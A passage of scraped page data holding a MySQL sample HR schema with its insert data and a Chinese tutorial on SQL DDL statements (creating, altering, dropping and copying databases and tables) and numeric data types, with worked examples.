'上级领导的员工编号',\n  `department_id` INT(4) COMMENT '部门编号',\n  `hiredate` DATETIME COMMENT '入职时间',\n  PRIMARY KEY (`employee_id`),\n  CONSTRAINT `dept_id_fk` FOREIGN KEY (`department_id`) REFERENCES `departments` (`department_id`),\n  CONSTRAINT `job_id_fk` FOREIGN KEY (`job_id`) REFERENCES `jobs` (`job_id`)\n) COMMENT '员工表';\n\n# 向locations表插入数据\ninsert into `locations`(`location_id`,`street_address`,`postal_code`,`city`,`state_province`,`country_id`) values\n(1000,'1297 Via Cola di Rie','00989','Roma',NULL,'IT'),\n(1100,'93091 Calle della Testa','10934','Venice',NULL,'IT'),\n(1200,'2017 Shinjuku-ku','1689','Tokyo','Tokyo Prefecture','JP'),\n(1300,'9450 Kamiya-cho','6823','Hiroshima',NULL,'JP'),\n(1400,'2014 Jabberwocky Rd','26192','Southlake','Texas','US'),\n(1500,'2011 Interiors Blvd','99236','South San Francisco','California','US'),\n(1600,'2007 Zagora St','50090','South Brunswick','New Jersey','US'),\n(1700,'2004 Charade Rd','98199','Seattle','Washington','US'),\n(1800,'147 Spadina Ave','M5V 2L7','Toronto','Ontario','CA'),\n(1900,'6092 Boxwood St','YSW 9T2','Whitehorse','Yukon','CA'),\n(2000,'40-5-12 Laogianggen','190518','Beijing',NULL,'CN'),\n(2100,'1298 Vileparle (E)','490231','Bombay','Maharashtra','IN'),\n(2200,'12-98 Victoria Street','2901','Sydney','New South Wales','AU'),\n(2300,'198 Clementi North','540198','Singapore',NULL,'SG'),\n(2400,'8204 Arthur St',NULL,'London',NULL,'UK'),\n(2500,'Magdalen Centre, The Oxford Science Park','OX9 9ZB','Oxford','Oxford','UK'),\n(2600,'9702 Chester Road','09629850293','Stretford','Manchester','UK'),\n(2700,'Schwanthalerstr. 7031','80925','Munich','Bavaria','DE'),\n(2800,'Rua Frei Caneca 1360 ','01307-002','Sao Paulo','Sao Paulo','BR'),\n(2900,'20 Rue des Corps-Saints','1730','Geneva','Geneve','CH'),\n(3000,'Murtenstrasse 921','3095','Bern','BE','CH'),\n(3100,'Pieter Breughelstraat 837','3029SK','Utrecht','Utrecht','NL'),\n(3200,'Mariano Escobedo 9991','11932','Mexico City','Distrito Federal,','MX');\n\n# 向departments表插入数据\ninsert into `departments`(`department_id`,`department_name`,`manager_id`,`location_id`) values\n(10,'Adm',200,1700),(20,'Mar',201,1800),(30,'Pur',114,1700),(40,'Hum',203,2400),\n(50,'Shi',121,1500),(60,'IT',103,1400),(70,'Pub',204,2700),(80,'Sal',145,2500),\n(90,'Exe',100,1700),(100,'Fin',108,1700),(110,'Acc',205,1700),(120,'Tre',NULL,1700),\n(130,'Cor',NULL,1700),(140,'Con',NULL,1700),(150,'Sha',NULL,1700),(160,'Ben',NULL,1700),\n(170,'Man',NULL,1700),(180,'Con',NULL,1700),(190,'Con',NULL,1700),(200,'Ope',NULL,1700),\n(210,'IT ',NULL,1700),(220,'NOC',NULL,1700),(230,'IT ',NULL,1700),(240,'Gov',NULL,1700),\n(250,'Ret',NULL,1700),(260,'Rec',NULL,1700),(270,'Pay',NULL,1700);\n\n# 向jobs表插入数据\ninsert into `jobs`(`job_id`,`job_title`,`min_salary`,`max_salary`) values\n('AC_ACCOUNT','Public Accountant',4200,9000),('AC_MGR','Accounting Manager',8200,16000),\n('AD_ASST','Administration Assistant',3000,6000),('AD_PRES','President',20000,40000),\n('AD_VP','Administration Vice President',15000,30000),('FI_ACCOUNT','Accountant',4200,9000),\n('FI_MGR','Finance Manager',8200,16000),('HR_REP','Human Resources Representative',4000,9000),\n('IT_PROG','Programmer',4000,10000),('MK_MAN','Marketing Manager',9000,15000),\n('MK_REP','Marketing Representative',4000,9000),('PR_REP','Public Relations Representative',4500,10500),\n('PU_CLERK','Purchasing Clerk',2500,5500),('PU_MAN','Purchasing Manager',8000,15000),\n('SA_MAN','Sales Manager',10000,20000),('SA_REP','Sales Representative',6000,12000),\n('SH_CLERK','Shipping Clerk',2500,5500),('ST_CLERK','Stock Clerk',2000,5000),\n('ST_MAN','Stock Manager',5500,8500);\n\n# 向employees表插入数据\ninsert into `employees`(`employee_id`,`first_name`,`last_name`,`email`,`phone_number`,`job_id`,`salary`,\n`commission_pct`,`manager_id`,`department_id`,`hiredate`) values\n(100,'Steven','K_ing','SKING','515.123.4567','AD_PRES',24000.00,NULL,NULL,90,'1992-04-03 00:00:00'),\n(101,'Neena','Kochhar','NKOCHHAR','515.123.4568','AD_VP',17000.00,NULL,100,90,'1992-04-03 00:00:00'),\n(102,'Lex','De Haan','LDEHAAN','515.123.4569','AD_VP',17000.00,NULL,100,90,'1992-04-03 00:00:00'),\n(103,'Alexander','Hunold','AHUNOLD','590.423.4567','IT_PROG',9000.00,NULL,102,60,'1992-04-03 00:00:00'),\n(104,'Bruce','Ernst','BERNST','590.423.4568','IT_PROG',6000.00,NULL,103,60,'1992-04-03 00:00:00'),\n(105,'David','Austin','DAUSTIN','590.423.4569','IT_PROG',4800.00,NULL,103,60,'1998-03-03 00:00:00'),\n(106,'Valli','Pataballa','VPATABAL','590.423.4560','IT_PROG',4800.00,NULL,103,60,'1998-03-03 00:00:00'),\n(107,'Diana','Lorentz','DLORENTZ','590.423.5567','IT_PROG',4200.00,NULL,103,60,'1998-03-03 00:00:00'),\n(108,'Nancy','Greenberg','NGREENBE','515.124.4569','FI_MGR',12000.00,NULL,101,100,'1998-03-03 00:00:00'),\n(109,'Daniel','Faviet','DFAVIET','515.124.4169','FI_ACCOUNT',9000.00,NULL,108,100,'1998-03-03 00:00:00'),\n(110,'John','Chen','JCHEN','515.124.4269','FI_ACCOUNT',8200.00,NULL,108,100,'2000-09-09 00:00:00'),\n(111,'Ismael','Sciarra','ISCIARRA','515.124.4369','FI_ACCOUNT',7700.00,NULL,108,100,'2000-09-09 00:00:00'),\n(112,'Jose Manuel','Urman','JMURMAN','515.124.4469','FI_ACCOUNT',7800.00,NULL,108,100,'2000-09-09 00:00:00'),\n(113,'Luis','Popp','LPOPP','515.124.4567','FI_ACCOUNT',6900.00,NULL,108,100,'2000-09-09 00:00:00'),\n(114,'Den','Raphaely','DRAPHEAL','515.127.4561','PU_MAN',11000.00,NULL,100,30,'2000-09-09 00:00:00'),\n(115,'Alexander','Khoo','AKHOO','515.127.4562','PU_CLERK',3100.00,NULL,114,30,'2000-09-09 00:00:00'),\n(116,'Shelli','Baida','SBAIDA','515.127.4563','PU_CLERK',2900.00,NULL,114,30,'2000-09-09 00:00:00'),\n(117,'Sigal','Tobias','STOBIAS','515.127.4564','PU_CLERK',2800.00,NULL,114,30,'2000-09-09 00:00:00'),\n(118,'Guy','Himuro','GHIMURO','515.127.4565','PU_CLERK',2600.00,NULL,114,30,'2000-09-09 00:00:00'),\n(119,'Karen','Colmenares','KCOLMENA','515.127.4566','PU_CLERK',2500.00,NULL,114,30,'2000-09-09 00:00:00'),\n(120,'Matthew','Weiss','MWEISS','650.123.1234','ST_MAN',8000.00,NULL,100,50,'2004-02-06 00:00:00'),\n(121,'Adam','Fripp','AFRIPP','650.123.2234','ST_MAN',8200.00,NULL,100,50,'2004-02-06 00:00:00'),\n(122,'Payam','Kaufling','PKAUFLIN','650.123.3234','ST_MAN',7900.00,NULL,100,50,'2004-02-06 00:00:00'),\n(123,'Shanta','Vollman','SVOLLMAN','650.123.4234','ST_MAN',6500.00,NULL,100,50,'2004-02-06 00:00:00'),\n(124,'Kevin','Mourgos','KMOURGOS','650.123.5234','ST_MAN',5800.00,NULL,100,50,'2004-02-06 00:00:00'),\n(125,'Julia','Nayer','JNAYER','650.124.1214','ST_CLERK',3200.00,NULL,120,50,'2004-02-06 00:00:00'),\n(126,'Irene','Mikkilineni','IMIKKILI','650.124.1224','ST_CLERK',2700.00,NULL,120,50,'2004-02-06 00:00:00'),\n(127,'James','Landry','JLANDRY','650.124.1334','ST_CLERK',2400.00,NULL,120,50,'2004-02-06 00:00:00'),\n(128,'Steven','Markle','SMARKLE','650.124.1434','ST_CLERK',2200.00,NULL,120,50,'2004-02-06 00:00:00'),\n(129,'Laura','Bissot','LBISSOT','650.124.5234','ST_CLERK',3300.00,NULL,121,50,'2004-02-06 00:00:00'),\n(130,'Mozhe','Atkinson','MATKINSO','650.124.6234','ST_CLERK',2800.00,NULL,121,50,'2004-02-06 00:00:00'),\n(131,'James','Marlow','JAMRLOW','650.124.7234','ST_CLERK',2500.00,NULL,121,50,'2004-02-06 00:00:00'),\n(132,'TJ','Olson','TJOLSON','650.124.8234','ST_CLERK',2100.00,NULL,121,50,'2004-02-06 00:00:00'),\n(133,'Jason','Mallin','JMALLIN','650.127.1934','ST_CLERK',3300.00,NULL,122,50,'2004-02-06 00:00:00'),\n(134,'Michael','Rogers','MROGERS','650.127.1834','ST_CLERK',2900.00,NULL,122,50,'2002-12-23 00:00:00'),\n(135,'Ki','Gee','KGEE','650.127.1734','ST_CLERK',2400.00,NULL,122,50,'2002-12-23 00:00:00'),\n(136,'Hazel','Philtanker','HPHILTAN','650.127.1634','ST_CLERK',2200.00,NULL,122,50,'2002-12-23 00:00:00'),\n(137,'Renske','Ladwig','RLADWIG','650.121.1234','ST_CLERK',3600.00,NULL,123,50,'2002-12-23 00:00:00'),\n(138,'Stephen','Stiles','SSTILES','650.121.2034','ST_CLERK',3200.00,NULL,123,50,'2002-12-23 00:00:00'),\n(139,'John','Seo','JSEO','650.121.2019','ST_CLERK',2700.00,NULL,123,50,'2002-12-23 00:00:00'),\n(140,'Joshua','Patel','JPATEL','650.121.1834','ST_CLERK',2500.00,NULL,123,50,'2002-12-23 00:00:00'),\n(141,'Trenna','Rajs','TRAJS','650.121.8009','ST_CLERK',3500.00,NULL,124,50,'2002-12-23 00:00:00'),\n(142,'Curtis','Davies','CDAVIES','650.121.2994','ST_CLERK',3100.00,NULL,124,50,'2002-12-23 00:00:00'),\n(143,'Randall','Matos','RMATOS','650.121.2874','ST_CLERK',2600.00,NULL,124,50,'2002-12-23 00:00:00'),\n(144,'Peter','Vargas','PVARGAS','650.121.2004','ST_CLERK',2500.00,NULL,124,50,'2002-12-23 00:00:00'),\n(145,'John','Russell','JRUSSEL','011.44.1344.429268','SA_MAN',14000.00,0.40,100,80,'2002-12-23 00:00:00'),\n(146,'Karen','Partners','KPARTNER','011.44.1344.467268','SA_MAN',13500.00,0.30,100,80,'2002-12-23 00:00:00'),\n(147,'Alberto','Errazuriz','AERRAZUR','011.44.1344.429278','SA_MAN',12000.00,0.30,100,80,'2002-12-23 00:00:00'),\n(148,'Gerald','Cambrault','GCAMBRAU','011.44.1344.619268','SA_MAN',11000.00,0.30,100,80,'2002-12-23 00:00:00'),\n(149,'Eleni','Zlotkey','EZLOTKEY','011.44.1344.429018','SA_MAN',10500.00,0.20,100,80,'2002-12-23 00:00:00'),\n(150,'Peter','Tucker','PTUCKER','011.44.1344.129268','SA_REP',10000.00,0.30,145,80,'2014-03-05 00:00:00'),\n(151,'David','Bernstein','DBERNSTE','011.44.1344.345268','SA_REP',9500.00,0.25,145,80,'2014-03-05 00:00:00'),\n(152,'Peter','Hall','PHALL','011.44.1344.478968','SA_REP',9000.00,0.25,145,80,'2014-03-05 00:00:00'),\n(153,'Christopher','Olsen','COLSEN','011.44.1344.498718','SA_REP',8000.00,0.20,145,80,'2014-03-05 00:00:00'),\n(154,'Nanette','Cambrault','NCAMBRAU','011.44.1344.987668','SA_REP',7500.00,0.20,145,80,'2014-03-05 00:00:00'),\n(155,'Oliver','Tuvault','OTUVAULT','011.44.1344.486508','SA_REP',7000.00,0.15,145,80,'2014-03-05 00:00:00'),\n(156,'Janette','K_ing','JKING','011.44.1345.429268','SA_REP',10000.00,0.35,146,80,'2014-03-05 00:00:00'),\n(157,'Patrick','Sully','PSULLY','011.44.1345.929268','SA_REP',9500.00,0.35,146,80,'2014-03-05 00:00:00'),\n(158,'Allan','McEwen','AMCEWEN','011.44.1345.829268','SA_REP',9000.00,0.35,146,80,'2014-03-05 00:00:00'),\n(159,'Lindsey','Smith','LSMITH','011.44.1345.729268','SA_REP',8000.00,0.30,146,80,'2014-03-05 00:00:00'),\n(160,'Louise','Doran','LDORAN','011.44.1345.629268','SA_REP',7500.00,0.30,146,80,'2014-03-05 00:00:00'),\n(161,'Sarath','Sewall','SSEWALL','011.44.1345.529268','SA_REP',7000.00,0.25,146,80,'2014-03-05 00:00:00'),\n(162,'Clara','Vishney','CVISHNEY','011.44.1346.129268','SA_REP',10500.00,0.25,147,80,'2014-03-05 00:00:00'),\n(163,'Danielle','Greene','DGREENE','011.44.1346.229268','SA_REP',9500.00,0.15,147,80,'2014-03-05 00:00:00'),\n(164,'Mattea','Marvins','MMARVINS','011.44.1346.329268','SA_REP',7200.00,0.10,147,80,'2014-03-05 00:00:00'),\n(165,'David','Lee','DLEE','011.44.1346.529268','SA_REP',6800.00,0.10,147,80,'2014-03-05 00:00:00'),\n(166,'Sundar','Ande','SANDE','011.44.1346.629268','SA_REP',6400.00,0.10,147,80,'2014-03-05 00:00:00'),\n(167,'Amit','Banda','ABANDA','011.44.1346.729268','SA_REP',6200.00,0.10,147,80,'2014-03-05 00:00:00'),\n(168,'Lisa','Ozer','LOZER','011.44.1343.929268','SA_REP',11500.00,0.25,148,80,'2014-03-05 00:00:00'),\n(169,'Harrison','Bloom','HBLOOM','011.44.1343.829268','SA_REP',10000.00,0.20,148,80,'2014-03-05 00:00:00'),\n(170,'Tayler','Fox','TFOX','011.44.1343.729268','SA_REP',9600.00,0.20,148,80,'2014-03-05 00:00:00'),\n(171,'William','Smith','WSMITH','011.44.1343.629268','SA_REP',7400.00,0.15,148,80,'2014-03-05 00:00:00'),\n(172,'Elizabeth','Bates','EBATES','011.44.1343.529268','SA_REP',7300.00,0.15,148,80,'2014-03-05 00:00:00'),\n(173,'Sundita','Kumar','SKUMAR','011.44.1343.329268','SA_REP',6100.00,0.10,148,80,'2014-03-05 00:00:00'),\n(174,'Ellen','Abel','EABEL','011.44.1644.429267','SA_REP',11000.00,0.30,149,80,'2014-03-05 00:00:00'),\n(175,'Alyssa','Hutton','AHUTTON','011.44.1644.429266','SA_REP',8800.00,0.25,149,80,'2014-03-05 00:00:00'),\n(176,'Jonathon','Taylor','JTAYLOR','011.44.1644.429265','SA_REP',8600.00,0.20,149,80,'2014-03-05 00:00:00'),\n(177,'Jack','Livingston','JLIVINGS','011.44.1644.429264','SA_REP',8400.00,0.20,149,80,'2014-03-05 00:00:00'),\n(178,'Kimberely','Grant','KGRANT','011.44.1644.429263','SA_REP',7000.00,0.15,149,NULL,'2014-03-05 00:00:00'),\n(179,'Charles','Johnson','CJOHNSON','011.44.1644.429262','SA_REP',6200.00,0.10,149,80,'2014-03-05 00:00:00'),\n(180,'Winston','Taylor','WTAYLOR','650.507.9876','SH_CLERK',3200.00,NULL,120,50,'2014-03-05 00:00:00'),\n(181,'Jean','Fleaur','JFLEAUR','650.507.9877','SH_CLERK',3100.00,NULL,120,50,'2014-03-05 00:00:00'),\n(182,'Martha','Sullivan','MSULLIVA','650.507.9878','SH_CLERK',2500.00,NULL,120,50,'2014-03-05 00:00:00'),\n(183,'Girard','Geoni','GGEONI','650.507.9879','SH_CLERK',2800.00,NULL,120,50,'2014-03-05 00:00:00'),\n(184,'Nandita','Sarchand','NSARCHAN','650.509.1876','SH_CLERK',4200.00,NULL,121,50,'2014-03-05 00:00:00'),\n(185,'Alexis','Bull','ABULL','650.509.2876','SH_CLERK',4100.00,NULL,121,50,'2014-03-05 00:00:00'),\n(186,'Julia','Dellinger','JDELLING','650.509.3876','SH_CLERK',3400.00,NULL,121,50,'2014-03-05 00:00:00'),\n(187,'Anthony','Cabrio','ACABRIO','650.509.4876','SH_CLERK',3000.00,NULL,121,50,'2014-03-05 00:00:00'),\n(188,'Kelly','Chung','KCHUNG','650.505.1876','SH_CLERK',3800.00,NULL,122,50,'2014-03-05 00:00:00'),\n(189,'Jennifer','Dilly','JDILLY','650.505.2876','SH_CLERK',3600.00,NULL,122,50,'2014-03-05 00:00:00'),\n(190,'Timothy','Gates','TGATES','650.505.3876','SH_CLERK',2900.00,NULL,122,50,'2014-03-05 00:00:00'),\n(191,'Randall','Perkins','RPERKINS','650.505.4876','SH_CLERK',2500.00,NULL,122,50,'2014-03-05 00:00:00'),\n(192,'Sarah','Bell','SBELL','650.501.1876','SH_CLERK',4000.00,NULL,123,50,'2014-03-05 00:00:00'),\n(193,'Britney','Everett','BEVERETT','650.501.2876','SH_CLERK',3900.00,NULL,123,50,'2014-03-05 00:00:00'),\n(194,'Samuel','McCain','SMCCAIN','650.501.3876','SH_CLERK',3200.00,NULL,123,50,'2014-03-05 00:00:00'),\n(195,'Vance','Jones','VJONES','650.501.4876','SH_CLERK',2800.00,NULL,123,50,'2014-03-05 00:00:00'),\n(196,'Alana','Walsh','AWALSH','650.507.9811','SH_CLERK',3100.00,NULL,124,50,'2014-03-05 00:00:00'),\n(197,'Kevin','Feeney','KFEENEY','650.507.9822','SH_CLERK',3000.00,NULL,124,50,'2014-03-05 00:00:00'),\n(198,'Donald','OConnell','DOCONNEL','650.507.9833','SH_CLERK',2600.00,NULL,124,50,'2014-03-05 00:00:00'),\n(199,'Douglas','Grant','DGRANT','650.507.9844','SH_CLERK',2600.00,NULL,124,50,'2014-03-05 00:00:00'),\n(200,'Jennifer','Whalen','JWHALEN','515.123.4444','AD_ASST',4400.00,NULL,101,10,'2016-03-03 00:00:00'),\n(201,'Michael','Hartstein','MHARTSTE','515.123.5555','MK_MAN',13000.00,NULL,100,20,'2016-03-03 00:00:00'),\n(202,'Pat','Fay','PFAY','603.123.6666','MK_REP',6000.00,NULL,201,20,'2016-03-03 00:00:00'),\n(203,'Susan','Mavris','SMAVRIS','515.123.7777','HR_REP',6500.00,NULL,101,40,'2016-03-03 00:00:00'),\n(204,'Hermann','Baer','HBAER','515.123.8888','PR_REP',10000.00,NULL,101,70,'2016-03-03 00:00:00'),\n(205,'Shelley','Higgins','SHIGGINS','515.123.8080','AC_MGR',12000.00,NULL,101,110,'2016-03-03 00:00:00'),\n(206,'William','Gietz','WGIETZ','515.123.8181','AC_ACCOUNT',8300.00,NULL,205,110,'2016-03-03 00:00:00');\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n",normalizedContent:"# 数据定义语言ddl\n\n\n# ddl简介\n\n数据定义语言(data definition language, ddl)是sql语言集中负责数据结构定义与数据库对象定义的语言。也就说是对库和表进行管理，具体就是创建(create)、修改(alter)、删除(drop)。常见的如下：\n\n * create database - 创建新数据库\n * alter database - 修改数据库\n * create table - 创建新表\n * alter table - 变更（改变）数据库表\n * drop table - 删除表\n * create index - 创建索引（搜索键）\n * drop index - 删除索引\n\n\n# 库的管理\n\n 1. 创建库\n    \n    语法：create database [if not exists] 库名;。[if exists]和[if not exists]只在库和表的创建和删除时才能使用。\n    \n    例如使用navicat创建一个test数据库，字符集是utf8mb4，那sql语句对应如下：\n    \n    # 创建库，可以不加``\n    create database `test`;\n    # 查看有哪些库\n    show databases;\n    \n    \n    1\n    2\n    3\n    4\n    \n    \n    如果你不清楚库是否存在，可以加上if not exists\n    \n    # 创建库可以带上了`if not exists`\n    create database if not exists `test`;\n    \n    \n    1\n    2\n    \n\n 2. 修改库\n    \n    修改库的操作很少，容易引起一些问题，但一些影响不太大的库设置是可以修改的。\n    \n    # 默认字符集一般是utf8\n    alter database `test` character set 'utf8mb4';\n    # 其实字符集可以在创建库时就带上\n    create database if not exists `test` character set 'utf8mb4';\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 3. 删除库\n    \n    语法：drop database [if exists] 库名\n    \n    # 删除库\n    drop database if exists `test`;\n    # 查看有哪些库\n    show databases;\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# 表的管理\n\n\n# 创建表\n\n语法：\n\ncreate table 表名 (\n  列名 列的类型 【列的约束】,\n  ...\n)\n\n\n1\n2\n3\n4\n\n\n创建一个book表和一个author表\n\n# 上一小节我们删掉了test库，这里重新建一个test库\ncreate database if not exists `test` character set 'utf8mb4';\n# 并且选择这个库作用当前库，否则会有`no database selected`错误\nuse test;\n# 先看一下test库里有哪些表\nshow tables;\n# 建一个book表，如果不清楚建的表存到了哪个库，就用`test`.`book`\ncreate table book (\n  id          int,          # 编号\n  bname       varchar(20),  # 书名\n  price       double,       # 价格\n  authorid    int           # 作者\n);\n# 查看book表的结构\ndesc book;\n# 建一个author表\ncreate table author (\n  id          int,          # 编号\n  aname       varchar(20),  # 作者名\n  nation      varchar(20)   # 国籍\n);\n# 查看author表的结构\ndesc author;\n# 看一下test库里有哪些表\nshow tables;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n关于no database selected错误，它的原因是没有指定当前数据库，sql运行时就不知道根据哪个数据来运行。\n\n * 第一种方式是使用use test;来指定当前数据库。\n * 第二种方式是在sql语句中将表名改为test.authore，但是每次使用表名前都需要加上这个库名就很麻烦。\n * 第三种方式是把数据库客户端当前查询框顶部里选定一个数据库。该方法最后重新连接一下云端数据库，保证指定数据库成功。\n\n\n\n\n# 修改表\n\n修改表的核心语法：alter table 表名 add|drop|modify|change column 列名 [类型或约束]\n\n * 修改列名\n   alter table 表名 change column 旧列名 新列名 列的类型;\n * 修改列的类型或约束\n   alter table 表名 modify column 列名 新类型或新约束;\n * 添加新列\n   alter table 表名 add column 新列的列名 新列的类型或约束;\n * 删除旧列\n   alter table 表名 drop column 旧列的列名;\n * 修改表名\n   alter table 表名 rename to 新表名;\n\n# 修改book表的bname列名为bookname，要带上类型\nalter table book change column  bname bookname varchar(20);\ndesc book;\n# 修改author表的id列的新类型为mediumint\nalter table author modify column id mediumint;\ndesc author;\n# 为book表添加publishdate新列，类型为datetime\nalter table book add column publishdate datetime;\ndesc book;\n# 删除book表的publishdate列\nalter table book drop column publishdate;\ndesc book;\n# 修改author表的表名为book_author\nalter table author rename to book_author;\ndesc book_author;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 删除表\n\n语法：drop table [if exists] 表名。[if exists]和[if not exists]只在库和表的创建和删除时才能使用。\n\n# 删除表book_author\ndrop table `test`.`book_author`;\n# 查看当前库里有哪些表\nshow tables;\n\n\n1\n2\n3\n4\n\n\n\n# 复制表\n\n * 只复制表结构：\n   create table 表名 like 被复制的表名;\n * 复制表结构以及表里的全部数据：\n   create table 表名 select * from 被复制的表名\n * 复制表的部分结构以及部分数据（如果只想把部分结构复制过去，可以将where后的条件设置成谁也不满足，例如1=2和0，而1是true）\n   create table 表名 select (列1, 列2) from 被复制的表名 where 数据限制条件。\n * 如果报1786 - statement violates gtid consistency: create table ... select.错误，是因为mysq启用了enforce_gtid_consistency功能，只允许能够保障事务安全并且能够被日志记录的sql语句被执行。create table 表名 as select * from 被复制的表名也会报同样的错误。\n   解决方法一：用命令修改set @@global.enforce_gtid_consistency = off;，但用命令我们需要用具有super或者system_variables_admin权限的用户，这个权限自己去配。但是像本人使用的阿里云rds mysql8.0版是不允许修改enforce_gtid_consistency参数的，这个可以去“云数据库rds/实例列表/参数设置”进行查询确定。后续它的mysql更新版本，可能就可以直接使用create table ... select。\n   解决方法二：因为第一种用不了，那只能将语句拆成create table 表名 like 被复制的表名;和insert into 表名 select (列1, 列2) from 被复制的表名;，但是这样的话，它就做不到复制部分结构了，它第一句就复制了完整的结构。\n\n# 因为上一节已经删掉作者表，所以这里重新建author表\ncreate table if not exists `test`.`author` (\n  id          int,          # 编号\n  aname       varchar(20),  # 作者名\n  nation      varchar(20)   # 国籍\n);\n# 插入数据\ninsert into author values\n(1, '村上春树', '日本'),\n(2, '莫言', '中国'),\n(3, '金庸', '中国'),\n(4, '冯唐', '中国');\nselect * from author;\n# 只复制表结构\ncreate table copy1 like author;\n# 查看是否复制成功\ndesc copy1;\nselect * from copy1;\n# 复制表结构以及表里的全部数据，阿里云rds mysql8.0版会报错，也不准修改enforce_gtid_consistency\ncreate table copy2 select * from author;\n# 复制表的部分结构以及部分数据，阿里云rds mysql8.0版会报错，也不准修改enforce_gtid_consistency\ncreate table copy3 select id,aname from author where nation='中国';\n# 只复制表部分结构，不携带数据，where后面写0或者1=2\ncreate table copy4 select id,aname from author where 0;\n# 拆成两个部分，如果是在阿里云rds mysql8.0版里\ncreate table copy5 like author;\ninsert into copy5 select id,aname from author where nation='中国';\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 常见数据类型\n\n\n# 数值型\n\n数值型分为以下几类\n\n * 整型：\n   * tinyint：1字节，有符号是-128 ~ 127，无符号是0 ~ 255。\n   * smallint：2字节，有符号是-32768 ~ 32767，无符号是0 ~ 65535。\n   * mediumint：3字节，有符号是-8388608 ~ 8388607，无符号是0 ~ 1677215。\n   * int、integer：4字节，有符号是-2147483648 ~ 2147483647，无符号是0 ~ 4294967295。\n   * bigint：8字节，有符号是-2^63 ~ 2^63-1，无符号是0 ~ 2^64-1。\n * 浮点小数：\n   * float(m,d)：4字节，±1.75494351e-38~±3.402823466e+38\n   * double(m,d)：8字节，±2.2250738585072014e-308~±1.7976931348623157e+308\n * 定点小数：\n   * dec(m,d)、decimal(m,d)：m+2字节，最大取值范围与double相同，给定decimal的有效取值范围由m和d决定\n\n整型的特点：\n\n * 都可以设置无符号和有符号，默认有符号，通过unsigned设置无符号。其实不推荐使用unsigned，可以通过约束来实现的。\n * 如果超出了范围，会报out or range异常，最终会自动插入临界值；（“严格模式”并不会插入，直接认为你这条插入语句无效）\n * 长度可以不指定，默认会有一个长度；这个长度只是在数据库的显示长度，可以插入比这个“长度”长的数据。具体的插入范围是具体整型的范围了。\n * 如果显示指定了，但实际插入长度比它小，则左边用0填充显示，要注意的是必须需要搭配zerofill才能实现；但是用了zerofill，它会默认变为无符号整型（也就是说不用自己加unsigned）。其实不推荐使用zerofill，推荐使用lpad()函数。\n\ndrop table if exists tab_int;\ncreate table tab_int ( t1 int );\n# 默认是有符号的，所以可以插入负数\ninsert into tab_int values(-123456);\nselect * from tab_int;\n# 新增一列，类型为int的无符号型。其实不推荐使用unsigned，可以通过约束来实现的。\nalter table tab_int add column t2 int unsigned;\ndesc tab_int;\n# 报错out of range value\ninsert into tab_int values(-123456, -123456);\nselect * from tab_int;\n# 显示指定长度\nalter table tab_int add column t3 int(6);\n# 可以插入比“长度”长的数据，“长度”只是一个显示长度，具体插入范围由int范围决定\ninsert into tab_int values(-123456, 123456, 12345678);\n# 加上zerofill关键字，在实际长度小于设置长度时，左边用0填充显示\nalter table tab_int add column t4 int(6) zerofill;\ndesc tab_int; # 其实不推荐使用zerofill，推荐使用lpad()函数。\n# 仍然可以插入比“长度”长的数据，“长度”只是一个显示长度，具体插入范围由int范围决定\ninsert into tab_int values(-123456, 123456, 12345678, 12345678);\n# 左边会用0填充显示\ninsert into tab_int values(-123456, 123456, 12345678, 123);\n# 但是加了zerofill会导致这一列也变成了unsigned，也就是无符号\ninsert into tab_int values(-123456, 123456, 12345678, -123);\nselect * from tab_int;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n浮点小数和定点小数的特点：\n\n * m代表整数部位+小数部位的个数，d代表小数部位；\n * 超出范围，如果是小数部位超出个数，会四舍五入舍弃多出的位数；如果是整数部位超出，会报out or range，直接自动插入四舍五入的临界值，例如m为3时它的临界值是999，但“严格模式”会认为这条报错语句最终无效，不会插入临界值。\n * m和d都可以省略，但对于定点数，m默认为10，d默认为0；\n * 如果精度要求较高，则优先考虑使用定点数；\n\ndrop table if exists tab_float;\ncreate table tab_float (\n  f1 float(5, 2),\n  f2 double(5, 2),\n  f3 decimal(5, 2)\n);\ndesc tab_float;\ninsert into tab_float values(123.456, 123.45, 123.45);\ninsert into tab_float values(123.45, 123.456, 123.45);\n# 如果是小数部位超出个数，会四舍五入舍弃多出的位数\ninsert into tab_float values(123.45, 123.45, 123.456);\n# 如果是整数部位超出，会报`out or range`\ninsert into tab_float values(1523.4, 1523.4, 1523.4);\nselect * from tab_float;\ndrop table if exists tab_float2;\n# 不加m和d，float和double插入没有限制，而decimal会让m默认为10，d为0\ncreate table tab_float2 (\n  f1 float,\n  f2 double,\n  f3 decimal\n);\ndesc tab_float2;\n# 如果是整数部位超出，会报`out or range`\ninsert into tab_float2 values(12.34, 